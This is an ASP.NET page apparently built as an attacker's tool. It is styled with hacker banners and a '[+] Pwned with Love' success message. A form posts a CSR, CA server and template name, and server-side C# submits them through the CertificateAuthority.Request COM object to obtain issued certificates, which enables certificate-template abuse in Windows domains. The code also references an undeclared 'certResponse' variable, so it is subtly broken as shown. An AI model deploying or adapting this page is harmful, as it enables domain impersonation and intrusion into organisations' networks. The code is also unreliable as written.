<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System" %>

<html>
<head>
    <title>--==[[ Certi-Bhai ]]==--</title>
</head>
<STYLE>
body {
font-family: Tahoma;
color: white;
background: black;
}

input {
border			: solid 2px ;
border-color		: black;
BACKGROUND-COLOR: #444444;
font: 8pt Verdana;

color: white;
}

submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}

#t input[type=\'submit\']{
	COLOR: White;
	border:none;
	BACKGROUND-COLOR: black;
}

#t input[type=\'submit\']:hover {
	
	BACKGROUND-COLOR: #ff9933;
	color: black;
	
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 0px ;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 2px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: #191919;;
color: #FFF;
}
textarea {
border			: dashed 2px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
A:link {
border: 1px;
	COLOR: red; TEXT-DECORATION: none
}
A:visited {
	COLOR: red; TEXT-DECORATION: none
}
A:hover {
	color: White; TEXT-DECORATION: none
}
A:active {
	color: white; TEXT-DECORATION: none
}
</STYLE>
<body>
   <table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

			

       <td width="100%" align=center valign="top" rowspan="1">
           <font color=#ff9933 size=15 face="comic sans ms"><b>--==[[ Certi-Bhai ]]==--</font> <div class="hedr"> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="1"><b> 
        <font color=#ff9933> 
        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font><br><font color=white>
       </td></tr></table>
</div><br><div align=center>
    <script runat="server">
        protected bool showForm = true; // Flag to control form display

        protected void Page_Load(object sender, EventArgs e)
        {
            if (Request.HttpMethod == "POST")
            {
                string csr = Request.Form["csrInput"];
                string caServer = Request.Form["caServer"];
                string templateName = Request.Form["templateName"];

                if (!string.IsNullOrEmpty(csr) && !string.IsNullOrEmpty(caServer) && !string.IsNullOrEmpty(templateName))
                {
                    try
                    {
                        // Create CCertRequest COM object dynamically
                        Type certRequestType = Type.GetTypeFromProgID("CertificateAuthority.Request");
                        dynamic certRequest = Activator.CreateInstance(certRequestType);

                        // Format the request attributes (Template Name)
                        string requestAttributes = "CertificateTemplate:" + templateName;

                        // Submit the CSR to the CA with Template Name
                        int result = certRequest.Submit(1, csr, requestAttributes, caServer);

                        // Handle the response
                     // Handle the response
                            if (result == 3)  // 3 = Issued
                            {
                                certResponse = "<h3 style='color:red;'> [+] Pwned with Love </br> [+] Enjoy the party....<br></h3>";
                                certResponse += "<textarea rows='10' cols='80'>" + Server.HtmlEncode(certRequest.GetCertificate(1)) + "</textarea>";
                            }
                            else if (result == 2)  // 2 = Pending
                            {
                                certResponse = "<h3 style='color:red;'>Request Pending</h3>";
                                certResponse += "<p>Status: " + Server.HtmlEncode(certRequest.GetDispositionMessage()) + "</p>";
                            }
                            else
                            {
                                certResponse = "<h3 style='color:red;'>Enrollment Failed</h3>";
                                certResponse += "<p>Error: " + Server.HtmlEncode(certRequest.GetDispositionMessage()) + "</p>";
                            }

                        showForm = false; // Hide the form after processing
                    }
                    catch (Exception ex)
                    {
                        Response.Write("<h3 style='color:red;'>Error: " + Server.HtmlEncode(ex.Message) + "</h3>");
                    }
                }
                else
                {
                    Response.Write("<h3 style='color:red;'>Error: Please provide a CSR, CA Server Name, and Template Name!</h3>");
                }
            }
        }
    </script>

    <% if (showForm) { %>
     <form method="post">
           <label for="caServer">CA Server Name:</label>
            <input type="text" name="caServer" required><br><br>

            <label for="templateName">Template Name:</label>
            <input type="text" name="templateName" required><br><br>

            <label for="csrInput">CSR:</label><br>
            <textarea name="csrInput" rows="24" cols="70" required></textarea><br><br>

            <input type="submit" value="Chal billu, Ghuma de sodda \m/">
        </form>
    <% } %>

</body>
</html>

